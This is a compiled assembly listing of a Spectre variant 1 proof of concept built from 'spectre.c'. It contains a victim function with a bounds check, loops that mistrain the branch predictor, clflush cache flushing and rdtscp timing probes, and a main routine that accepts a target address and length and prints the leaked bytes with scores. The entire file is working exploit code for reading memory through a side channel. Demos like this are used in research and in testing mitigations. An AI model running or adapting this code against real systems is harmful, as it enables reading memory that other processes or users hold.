	.text
	.intel_syntax noprefix
	.file	"spectre.c"
	.globl	check                           # -- Begin function check
	.p2align	4, 0x90
	.type	check,@function
check:                                  # @check
	.cfi_startproc
# %bb.0:
	movsxd	rcx, dword ptr [rip + array1_size]
	xor	eax, eax
	cmp	rcx, rdi
	seta	al
	ret
.Lfunc_end0:
	.size	check, .Lfunc_end0-check
	.cfi_endproc
                                        # -- End function
	.globl	victim_function                 # -- Begin function victim_function
	.p2align	4, 0x90
	.type	victim_function,@function
victim_function:                        # @victim_function
	.cfi_startproc
# %bb.0:
	movsxd	rax, dword ptr [rip + array1_size]
	xor	ecx, ecx
	cmp	rax, rdi
	cmova	rcx, rdi
	lea	rax, [rip + array1]
	movzx	eax, byte ptr [rcx + rax]
	shl	rax, 9
	lea	rcx, [rip + array2]
	mov	al, byte ptr [rax + rcx]
	and	byte ptr [rip + temp], al
	ret
.Lfunc_end1:
	.size	victim_function, .Lfunc_end1-victim_function
	.cfi_endproc
                                        # -- End function
	.globl	readMemoryByte                  # -- Begin function readMemoryByte
	.p2align	4, 0x90
	.type	readMemoryByte,@function
readMemoryByte:                         # @readMemoryByte
	.cfi_startproc
# %bb.0:
	push	rbp
	.cfi_def_cfa_offset 16
	push	r15
	.cfi_def_cfa_offset 24
	push	r14
	.cfi_def_cfa_offset 32
	push	r13
	.cfi_def_cfa_offset 40
	push	r12
	.cfi_def_cfa_offset 48
	push	rbx
	.cfi_def_cfa_offset 56
	sub	rsp, 40
	.cfi_def_cfa_offset 96
	.cfi_offset rbx, -56
	.cfi_offset r12, -48
	.cfi_offset r13, -40
	.cfi_offset r14, -32
	.cfi_offset r15, -24
	.cfi_offset rbp, -16
	mov	qword ptr [rsp + 24], rdx       # 8-byte Spill
	mov	qword ptr [rsp + 16], rsi       # 8-byte Spill
	mov	qword ptr [rsp + 32], rdi       # 8-byte Spill
	lea	rdi, [rip + readMemoryByte.results]
	xor	ebx, ebx
	mov	edx, 1024
	xor	esi, esi
	call	memset@PLT
	mov	eax, 999
	lea	r15, [rip + array2]
	.p2align	4, 0x90
.LBB2_1:                                # =>This Loop Header: Depth=1
                                        #     Child Loop BB2_2 Depth 2
                                        #     Child Loop BB2_4 Depth 2
                                        #       Child Loop BB2_24 Depth 3
                                        #     Child Loop BB2_7 Depth 2
                                        #     Child Loop BB2_13 Depth 2
	xor	ecx, ecx
	.p2align	4, 0x90
.LBB2_2:                                #   Parent Loop BB2_1 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	clflush	byte ptr [rcx + r15]
	clflush	byte ptr [rcx + r15 + 512]
	clflush	byte ptr [rcx + r15 + 1024]
	clflush	byte ptr [rcx + r15 + 1536]
	clflush	byte ptr [rcx + r15 + 2048]
	clflush	byte ptr [rcx + r15 + 2560]
	clflush	byte ptr [rcx + r15 + 3072]
	clflush	byte ptr [rcx + r15 + 3584]
	add	rcx, 4096
	cmp	rcx, 131072
	jne	.LBB2_2
# %bb.3:                                #   in Loop: Header=BB2_1 Depth=1
	mov	rbp, rax
                                        # kill: def $eax killed $eax killed $rax
	cdq
	idiv	dword ptr [rip + array1_size]
	mov	r13d, edx
	mov	r14, r13
	xor	r14, qword ptr [rsp + 32]       # 8-byte Folded Reload
	mov	r12d, 29
	jmp	.LBB2_4
	.p2align	4, 0x90
.LBB2_5:                                #   in Loop: Header=BB2_4 Depth=2
	mov	eax, r12d
	mov	ecx, 2863311531
	imul	rax, rcx
	shr	rax, 34
	add	eax, eax
	lea	eax, [rax + 2*rax]
	not	eax
	add	eax, r12d
	and	eax, -65536
	cdqe
	mov	rdi, rax
	shr	rdi, 16
	or	rdi, rax
	and	rdi, r14
	xor	rdi, r13
	call	victim_function
	sub	r12d, 1
	jb	.LBB2_6
.LBB2_4:                                #   Parent Loop BB2_1 Depth=1
                                        # =>  This Loop Header: Depth=2
                                        #       Child Loop BB2_24 Depth 3
	clflush	byte ptr [rip + array1_size]
	mov	dword ptr [rsp + 12], 0
	mov	eax, dword ptr [rsp + 12]
	cmp	eax, 99
	jg	.LBB2_5
	.p2align	4, 0x90
.LBB2_24:                               #   Parent Loop BB2_1 Depth=1
                                        #     Parent Loop BB2_4 Depth=2
                                        # =>    This Inner Loop Header: Depth=3
	add	dword ptr [rsp + 12], 1
	mov	eax, dword ptr [rsp + 12]
	cmp	eax, 100
	jl	.LBB2_24
	jmp	.LBB2_5
	.p2align	4, 0x90
.LBB2_6:                                #   in Loop: Header=BB2_1 Depth=1
	mov	edi, 13
	lea	r9, [rip + readMemoryByte.results]
	mov	r8, rbp
	lea	r10, [rip + array1]
	jmp	.LBB2_7
	.p2align	4, 0x90
.LBB2_11:                               #   in Loop: Header=BB2_7 Depth=2
	add	edi, 167
	cmp	edi, 42765
	je	.LBB2_12
.LBB2_7:                                #   Parent Loop BB2_1 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	mov	eax, edi
	and	eax, 255
	je	.LBB2_11
# %bb.8:                                #   in Loop: Header=BB2_7 Depth=2
	mov	ebp, eax
	mov	rbx, rbp
	shl	rbx, 9
	rdtscp
	mov	rsi, rdx
	shl	rsi, 32
	or	rsi, rax
	movzx	eax, byte ptr [rbx + r15]
	rdtscp
	mov	ebx, ecx
	shl	rdx, 32
	or	rdx, rax
	sub	rdx, rsi
	cmp	rdx, 100
	ja	.LBB2_11
# %bb.9:                                #   in Loop: Header=BB2_7 Depth=2
	mov	eax, r8d
	cdq
	idiv	dword ptr [rip + array1_size]
                                        # kill: def $edx killed $edx def $rdx
	cmp	dil, byte ptr [rdx + r10]
	je	.LBB2_11
# %bb.10:                               #   in Loop: Header=BB2_7 Depth=2
	add	dword ptr [r9 + 4*rbp], 1
	jmp	.LBB2_11
	.p2align	4, 0x90
.LBB2_12:                               #   in Loop: Header=BB2_1 Depth=1
	mov	eax, -1
	mov	rcx, r9
	xor	edx, edx
	mov	esi, -1
	jmp	.LBB2_13
	.p2align	4, 0x90
.LBB2_14:                               #   in Loop: Header=BB2_13 Depth=2
	mov	esi, eax
	mov	eax, edx
.LBB2_19:                               #   in Loop: Header=BB2_13 Depth=2
	add	rdx, 1
	add	rcx, 4
	cmp	rdx, 256
	je	.LBB2_20
.LBB2_13:                               #   Parent Loop BB2_1 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	test	eax, eax
	js	.LBB2_14
# %bb.15:                               #   in Loop: Header=BB2_13 Depth=2
	mov	edi, dword ptr [rcx]
	mov	ebp, eax
	cmp	edi, dword ptr [r9 + 4*rbp]
	jge	.LBB2_14
# %bb.16:                               #   in Loop: Header=BB2_13 Depth=2
	test	esi, esi
	js	.LBB2_18
# %bb.17:                               #   in Loop: Header=BB2_13 Depth=2
	mov	ebp, esi
	cmp	edi, dword ptr [r9 + 4*rbp]
	jl	.LBB2_19
.LBB2_18:                               #   in Loop: Header=BB2_13 Depth=2
	mov	esi, edx
	jmp	.LBB2_19
	.p2align	4, 0x90
.LBB2_20:                               #   in Loop: Header=BB2_1 Depth=1
	movsxd	rcx, eax
	mov	edx, dword ptr [r9 + 4*rcx]
	movsxd	rbp, esi
	mov	esi, dword ptr [r9 + 4*rbp]
	lea	edi, [rsi + rsi]
	add	edi, 5
	cmp	edx, edi
	jge	.LBB2_23
# %bb.21:                               #   in Loop: Header=BB2_1 Depth=1
	xor	edx, 2
	or	edx, esi
	je	.LBB2_23
# %bb.22:                               #   in Loop: Header=BB2_1 Depth=1
	lea	edx, [r8 - 1]
	cmp	r8d, 1
	mov	eax, edx
	ja	.LBB2_1
.LBB2_23:
	xor	dword ptr [rip + readMemoryByte.results], ebx
	lea	rdx, [rip + readMemoryByte.results]
	mov	rdi, qword ptr [rsp + 16]       # 8-byte Reload
	mov	byte ptr [rdi], cl
	mov	ecx, dword ptr [rdx + 4*rcx]
	mov	rsi, qword ptr [rsp + 24]       # 8-byte Reload
	mov	dword ptr [rsi], ecx
	mov	byte ptr [rdi + 1], bpl
	mov	eax, dword ptr [rdx + 4*rbp]
	mov	dword ptr [rsi + 4], eax
	add	rsp, 40
	.cfi_def_cfa_offset 56
	pop	rbx
	.cfi_def_cfa_offset 48
	pop	r12
	.cfi_def_cfa_offset 40
	pop	r13
	.cfi_def_cfa_offset 32
	pop	r14
	.cfi_def_cfa_offset 24
	pop	r15
	.cfi_def_cfa_offset 16
	pop	rbp
	.cfi_def_cfa_offset 8
	ret
.Lfunc_end2:
	.size	readMemoryByte, .Lfunc_end2-readMemoryByte
	.cfi_endproc
                                        # -- End function
	.globl	main                            # -- Begin function main
	.p2align	4, 0x90
	.type	main,@function
main:                                   # @main
	.cfi_startproc
# %bb.0:
	push	rbp
	.cfi_def_cfa_offset 16
	push	r15
	.cfi_def_cfa_offset 24
	push	r14
	.cfi_def_cfa_offset 32
	push	r13
	.cfi_def_cfa_offset 40
	push	r12
	.cfi_def_cfa_offset 48
	push	rbx
	.cfi_def_cfa_offset 56
	sub	rsp, 56
	.cfi_def_cfa_offset 112
	.cfi_offset rbx, -56
	.cfi_offset r12, -48
	.cfi_offset r13, -40
	.cfi_offset r14, -32
	.cfi_offset r15, -24
	.cfi_offset rbp, -16
	mov	qword ptr [rsp + 32], rsi       # 8-byte Spill
	mov	dword ptr [rsp + 28], edi       # 4-byte Spill
	mov	rbx, qword ptr [rip + stdin@GOTPCREL]
	lea	r13, [rip + array1]
	lea	r15, [rip + array2]
	jmp	.LBB3_1
	.p2align	4, 0x90
.LBB3_35:                               #   in Loop: Header=BB3_1 Depth=1
	xor	eax, eax
	call	getpid@PLT
	lea	rdi, [rip + .L.str.13]
	lea	rsi, [rip + check+33]
	mov	edx, eax
	xor	eax, eax
	call	printf@PLT
.LBB3_1:                                # =>This Loop Header: Depth=1
                                        #     Child Loop BB3_8 Depth 2
                                        #       Child Loop BB3_9 Depth 3
                                        #         Child Loop BB3_10 Depth 4
                                        #         Child Loop BB3_12 Depth 4
                                        #           Child Loop BB3_37 Depth 5
                                        #         Child Loop BB3_15 Depth 4
                                        #         Child Loop BB3_21 Depth 4
	mov	rdi, qword ptr [rbx]
	call	getc@PLT
	shl	eax, 24
	cmp	eax, 167772160
	je	.LBB3_1
# %bb.2:                                #   in Loop: Header=BB3_1 Depth=1
	cmp	eax, 1761607680
	je	.LBB3_35
# %bb.3:                                #   in Loop: Header=BB3_1 Depth=1
	cmp	eax, 1912602624
	jne	.LBB3_36
# %bb.4:                                #   in Loop: Header=BB3_1 Depth=1
	mov	rdx, qword ptr [rip + secret]
	lea	rdi, [rip + .L.str.1]
	mov	rsi, rdx
	xor	eax, eax
	call	printf@PLT
	mov	rdi, qword ptr [rip + secret]
	mov	rax, rdi
	sub	rax, r13
	mov	qword ptr [rsp + 8], rax
	call	strlen@PLT
	mov	rbp, rax
	mov	dword ptr [rsp], ebp
	mov	edx, 131072
	mov	rdi, r15
	mov	esi, 1
	call	memset@PLT
	cmp	dword ptr [rsp + 28], 3         # 4-byte Folded Reload
	jne	.LBB3_6
# %bb.5:                                #   in Loop: Header=BB3_1 Depth=1
	mov	rbx, qword ptr [rsp + 32]       # 8-byte Reload
	mov	rdi, qword ptr [rbx + 8]
	lea	rsi, [rip + .L.str.2]
	lea	rdx, [rsp + 8]
	xor	eax, eax
	call	__isoc99_sscanf@PLT
	sub	qword ptr [rsp + 8], r13
	mov	rdi, qword ptr [rbx + 16]
	lea	rsi, [rip + .L.str.3]
	mov	rdx, rsp
	xor	eax, eax
	call	__isoc99_sscanf@PLT
	mov	rsi, qword ptr [rsp + 8]
	mov	edx, dword ptr [rsp]
	lea	rdi, [rip + .L.str.4]
	xor	eax, eax
	call	printf@PLT
	mov	ebp, dword ptr [rsp]
.LBB3_6:                                #   in Loop: Header=BB3_1 Depth=1
	lea	rdi, [rip + .L.str.5]
	mov	esi, ebp
	xor	eax, eax
	call	printf@PLT
	mov	eax, dword ptr [rsp]
	lea	ecx, [rax - 1]
	mov	dword ptr [rsp], ecx
	test	eax, eax
	jle	.LBB3_34
# %bb.7:                                #   in Loop: Header=BB3_1 Depth=1
	xor	ebx, ebx
	jmp	.LBB3_8
	.p2align	4, 0x90
.LBB3_33:                               #   in Loop: Header=BB3_8 Depth=2
	mov	edi, 10
	call	putchar@PLT
	mov	eax, dword ptr [rsp]
	lea	ecx, [rax - 1]
	mov	dword ptr [rsp], ecx
	test	eax, eax
	mov	rbx, qword ptr [rsp + 40]       # 8-byte Reload
	jle	.LBB3_34
.LBB3_8:                                #   Parent Loop BB3_1 Depth=1
                                        # =>  This Loop Header: Depth=2
                                        #       Child Loop BB3_9 Depth 3
                                        #         Child Loop BB3_10 Depth 4
                                        #         Child Loop BB3_12 Depth 4
                                        #           Child Loop BB3_37 Depth 5
                                        #         Child Loop BB3_15 Depth 4
                                        #         Child Loop BB3_21 Depth 4
	mov	rsi, qword ptr [rsp + 8]
	mov	rax, qword ptr [rip + secret]
	movsx	edx, byte ptr [rax + rbx]
	xor	ebp, ebp
	lea	rdi, [rip + .L.str.6]
	xor	eax, eax
	call	printf@PLT
	add	rbx, 1
	mov	qword ptr [rsp + 40], rbx       # 8-byte Spill
	mov	rax, qword ptr [rsp + 8]
	mov	qword ptr [rsp + 48], rax       # 8-byte Spill
	add	rax, 1
	mov	qword ptr [rsp + 8], rax
	mov	edx, 1024
	lea	rdi, [rip + readMemoryByte.results]
	xor	esi, esi
	call	memset@PLT
	mov	eax, 999
	mov	qword ptr [rsp + 16], rax       # 8-byte Spill
	.p2align	4, 0x90
.LBB3_9:                                #   Parent Loop BB3_1 Depth=1
                                        #     Parent Loop BB3_8 Depth=2
                                        # =>    This Loop Header: Depth=3
                                        #         Child Loop BB3_10 Depth 4
                                        #         Child Loop BB3_12 Depth 4
                                        #           Child Loop BB3_37 Depth 5
                                        #         Child Loop BB3_15 Depth 4
                                        #         Child Loop BB3_21 Depth 4
	mov	rbx, r13
	xor	eax, eax
	.p2align	4, 0x90
.LBB3_10:                               #   Parent Loop BB3_1 Depth=1
                                        #     Parent Loop BB3_8 Depth=2
                                        #       Parent Loop BB3_9 Depth=3
                                        # =>      This Inner Loop Header: Depth=4
	clflush	byte ptr [rax + r15]
	clflush	byte ptr [rax + r15 + 512]
	clflush	byte ptr [rax + r15 + 1024]
	clflush	byte ptr [rax + r15 + 1536]
	clflush	byte ptr [rax + r15 + 2048]
	clflush	byte ptr [rax + r15 + 2560]
	clflush	byte ptr [rax + r15 + 3072]
	clflush	byte ptr [rax + r15 + 3584]
	add	rax, 4096
	cmp	rax, 131072
	jne	.LBB3_10
# %bb.11:                               #   in Loop: Header=BB3_9 Depth=3
	mov	rax, qword ptr [rsp + 16]       # 8-byte Reload
                                        # kill: def $eax killed $eax killed $rax
	cdq
	idiv	dword ptr [rip + array1_size]
	mov	r14d, edx
	mov	r13, qword ptr [rsp + 48]       # 8-byte Reload
	xor	r13, r14
	mov	r12d, 29
	jmp	.LBB3_12
	.p2align	4, 0x90
.LBB3_13:                               #   in Loop: Header=BB3_12 Depth=4
	mov	eax, r12d
	mov	ecx, 2863311531
	imul	rax, rcx
	shr	rax, 34
	add	eax, eax
	lea	eax, [rax + 2*rax]
	not	eax
	add	eax, r12d
	and	eax, -65536
	cdqe
	mov	rdi, rax
	shr	rdi, 16
	or	rdi, rax
	and	rdi, r13
	xor	rdi, r14
	call	victim_function
	sub	r12d, 1
	jb	.LBB3_14
.LBB3_12:                               #   Parent Loop BB3_1 Depth=1
                                        #     Parent Loop BB3_8 Depth=2
                                        #       Parent Loop BB3_9 Depth=3
                                        # =>      This Loop Header: Depth=4
                                        #           Child Loop BB3_37 Depth 5
	clflush	byte ptr [rip + array1_size]
	mov	dword ptr [rsp + 4], 0
	mov	eax, dword ptr [rsp + 4]
	cmp	eax, 99
	jg	.LBB3_13
	.p2align	4, 0x90
.LBB3_37:                               #   Parent Loop BB3_1 Depth=1
                                        #     Parent Loop BB3_8 Depth=2
                                        #       Parent Loop BB3_9 Depth=3
                                        #         Parent Loop BB3_12 Depth=4
                                        # =>        This Inner Loop Header: Depth=5
	add	dword ptr [rsp + 4], 1
	mov	eax, dword ptr [rsp + 4]
	cmp	eax, 100
	jl	.LBB3_37
	jmp	.LBB3_13
	.p2align	4, 0x90
.LBB3_14:                               #   in Loop: Header=BB3_9 Depth=3
	mov	edi, 13
	mov	r13, rbx
	lea	r8, [rip + readMemoryByte.results]
	mov	r9, qword ptr [rsp + 16]        # 8-byte Reload
	jmp	.LBB3_15
	.p2align	4, 0x90
.LBB3_19:                               #   in Loop: Header=BB3_15 Depth=4
	add	edi, 167
	cmp	edi, 42765
	je	.LBB3_20
.LBB3_15:                               #   Parent Loop BB3_1 Depth=1
                                        #     Parent Loop BB3_8 Depth=2
                                        #       Parent Loop BB3_9 Depth=3
                                        # =>      This Inner Loop Header: Depth=4
	mov	eax, edi
	and	eax, 255
	je	.LBB3_19
# %bb.16:                               #   in Loop: Header=BB3_15 Depth=4
	mov	ebx, eax
	mov	rbp, rbx
	shl	rbp, 9
	rdtscp
	mov	rsi, rdx
	shl	rsi, 32
	or	rsi, rax
	movzx	eax, byte ptr [rbp + r15]
	rdtscp
	mov	ebp, ecx
	shl	rdx, 32
	or	rdx, rax
	sub	rdx, rsi
	cmp	rdx, 100
	ja	.LBB3_19
# %bb.17:                               #   in Loop: Header=BB3_15 Depth=4
	mov	eax, r9d
	cdq
	idiv	dword ptr [rip + array1_size]
                                        # kill: def $edx killed $edx def $rdx
	cmp	dil, byte ptr [rdx + r13]
	je	.LBB3_19
# %bb.18:                               #   in Loop: Header=BB3_15 Depth=4
	add	dword ptr [r8 + 4*rbx], 1
	jmp	.LBB3_19
	.p2align	4, 0x90
.LBB3_20:                               #   in Loop: Header=BB3_9 Depth=3
	mov	eax, -1
	mov	rcx, r8
	xor	edx, edx
	mov	r14d, -1
	jmp	.LBB3_21
	.p2align	4, 0x90
.LBB3_22:                               #   in Loop: Header=BB3_21 Depth=4
	mov	r14d, eax
	mov	eax, edx
.LBB3_27:                               #   in Loop: Header=BB3_21 Depth=4
	add	rdx, 1
	add	rcx, 4
	cmp	rdx, 256
	je	.LBB3_28
.LBB3_21:                               #   Parent Loop BB3_1 Depth=1
                                        #     Parent Loop BB3_8 Depth=2
                                        #       Parent Loop BB3_9 Depth=3
                                        # =>      This Inner Loop Header: Depth=4
	test	eax, eax
	js	.LBB3_22
# %bb.23:                               #   in Loop: Header=BB3_21 Depth=4
	mov	esi, dword ptr [rcx]
	mov	edi, eax
	cmp	esi, dword ptr [r8 + 4*rdi]
	jge	.LBB3_22
# %bb.24:                               #   in Loop: Header=BB3_21 Depth=4
	test	r14d, r14d
	js	.LBB3_26
# %bb.25:                               #   in Loop: Header=BB3_21 Depth=4
	mov	edi, r14d
	cmp	esi, dword ptr [r8 + 4*rdi]
	jl	.LBB3_27
.LBB3_26:                               #   in Loop: Header=BB3_21 Depth=4
	mov	r14d, edx
	jmp	.LBB3_27
	.p2align	4, 0x90
.LBB3_28:                               #   in Loop: Header=BB3_9 Depth=3
	movsxd	r12, eax
	mov	ecx, dword ptr [r8 + 4*r12]
	movsxd	rax, r14d
	mov	edx, dword ptr [r8 + 4*rax]
	lea	esi, [rdx + rdx]
	add	esi, 5
	cmp	ecx, esi
	jge	.LBB3_31
# %bb.29:                               #   in Loop: Header=BB3_9 Depth=3
	xor	ecx, 2
	or	ecx, edx
	je	.LBB3_31
# %bb.30:                               #   in Loop: Header=BB3_9 Depth=3
	mov	rdx, qword ptr [rsp + 16]       # 8-byte Reload
	lea	ecx, [rdx - 1]
	cmp	edx, 1
                                        # kill: def $ecx killed $ecx def $rcx
	mov	qword ptr [rsp + 16], rcx       # 8-byte Spill
	ja	.LBB3_9
.LBB3_31:                               #   in Loop: Header=BB3_8 Depth=2
	xor	dword ptr [rip + readMemoryByte.results], ebp
	mov	ebp, dword ptr [r8 + 4*r12]
	mov	ebx, dword ptr [r8 + 4*rax]
	lea	eax, [rbx + rbx]
	cmp	ebp, eax
	lea	rsi, [rip + .L.str.8]
	lea	rax, [rip + .L.str.9]
	cmovl	rsi, rax
	lea	rdi, [rip + .L.str.7]
	xor	eax, eax
	call	printf@PLT
	movzx	esi, r12b
	lea	eax, [rsi - 32]
	cmp	al, 95
	mov	edx, 63
	cmovb	edx, esi
	lea	rdi, [rip + .L.str.10]
                                        # kill: def $esi killed $esi killed $rsi
	mov	ecx, ebp
	xor	eax, eax
	call	printf@PLT
	test	ebx, ebx
	jle	.LBB3_33
# %bb.32:                               #   in Loop: Header=BB3_8 Depth=2
	movzx	esi, r14b
	lea	eax, [rsi - 32]
	cmp	al, 95
	mov	edx, 63
	cmovb	edx, esi
	lea	rdi, [rip + .L.str.11]
                                        # kill: def $esi killed $esi killed $rsi
	mov	ecx, ebx
	xor	eax, eax
	call	printf@PLT
	jmp	.LBB3_33
	.p2align	4, 0x90
.LBB3_34:                               #   in Loop: Header=BB3_1 Depth=1
	mov	rbx, qword ptr [rip + stdin@GOTPCREL]
	jmp	.LBB3_1
.LBB3_36:
	xor	eax, eax
	add	rsp, 56
	.cfi_def_cfa_offset 56
	pop	rbx
	.cfi_def_cfa_offset 48
	pop	r12
	.cfi_def_cfa_offset 40
	pop	r13
	.cfi_def_cfa_offset 32
	pop	r14
	.cfi_def_cfa_offset 24
	pop	r15
	.cfi_def_cfa_offset 16
	pop	rbp
	.cfi_def_cfa_offset 8
	ret
.Lfunc_end3:
	.size	main, .Lfunc_end3-main
	.cfi_endproc
                                        # -- End function
	.type	array1_size,@object             # @array1_size
	.data
	.globl	array1_size
	.p2align	2
array1_size:
	.long	16                              # 0x10
	.size	array1_size, 4

	.type	array1,@object                  # @array1
	.globl	array1
	.p2align	4
array1:
	.ascii	"\001\002\003\004\005\006\007\b\t\n\013\f\r\016\017\020"
	.zero	144
	.size	array1, 160

	.type	.L.str,@object                  # @.str
	.section	.rodata.str1.1,"aMS",@progbits,1
.L.str:
	.asciz	"The Magic Words are Squeamish Ossifrage."
	.size	.L.str, 41

	.type	secret,@object                  # @secret
	.data
	.globl	secret
	.p2align	3
secret:
	.quad	.L.str
	.size	secret, 8

	.type	temp,@object                    # @temp
	.bss
	.globl	temp
temp:
	.byte	0                               # 0x0
	.size	temp, 1

	.type	array2,@object                  # @array2
	.globl	array2
	.p2align	4
array2:
	.zero	131072
	.size	array2, 131072

	.type	readMemoryByte.results,@object  # @readMemoryByte.results
	.local	readMemoryByte.results
	.comm	readMemoryByte.results,1024,16
	.type	.L.str.1,@object                # @.str.1
	.section	.rodata.str1.1,"aMS",@progbits,1
.L.str.1:
	.asciz	"Putting '%s' in memory, address %p\n"
	.size	.L.str.1, 36

	.type	.L.str.2,@object                # @.str.2
.L.str.2:
	.asciz	"%p"
	.size	.L.str.2, 3

	.type	.L.str.3,@object                # @.str.3
.L.str.3:
	.asciz	"%d"
	.size	.L.str.3, 3

	.type	.L.str.4,@object                # @.str.4
.L.str.4:
	.asciz	"Trying malicious_x = %p, len = %d\n"
	.size	.L.str.4, 35

	.type	.L.str.5,@object                # @.str.5
.L.str.5:
	.asciz	"Reading %d bytes:\n"
	.size	.L.str.5, 19

	.type	.L.str.6,@object                # @.str.6
.L.str.6:
	.asciz	"Reading at malicious_x = %p secc= %c ..."
	.size	.L.str.6, 41

	.type	.L.str.7,@object                # @.str.7
.L.str.7:
	.asciz	"%s: "
	.size	.L.str.7, 5

	.type	.L.str.8,@object                # @.str.8
.L.str.8:
	.asciz	"Success"
	.size	.L.str.8, 8

	.type	.L.str.9,@object                # @.str.9
.L.str.9:
	.asciz	"Unclear"
	.size	.L.str.9, 8

	.type	.L.str.10,@object               # @.str.10
.L.str.10:
	.asciz	"0x%02X='%c' score=%d "
	.size	.L.str.10, 22

	.type	.L.str.11,@object               # @.str.11
.L.str.11:
	.asciz	"(second best: 0x%02X='%c' score=%d)"
	.size	.L.str.11, 36

	.type	.L.str.13,@object               # @.str.13
.L.str.13:
	.asciz	"addr = %llx, pid = %d\n"
	.size	.L.str.13, 23

	.type	unused1,@object                 # @unused1
	.bss
	.globl	unused1
	.p2align	4
unused1:
	.zero	64
	.size	unused1, 64

	.type	unused2,@object                 # @unused2
	.globl	unused2
	.p2align	4
unused2:
	.zero	64
	.size	unused2, 64

	.ident	"Ubuntu clang version 14.0.0-1ubuntu1.1"
	.section	".note.GNU-stack","",@progbits
	.addrsig
	.addrsig_sym check
	.addrsig_sym array1_size
	.addrsig_sym array1
	.addrsig_sym array2
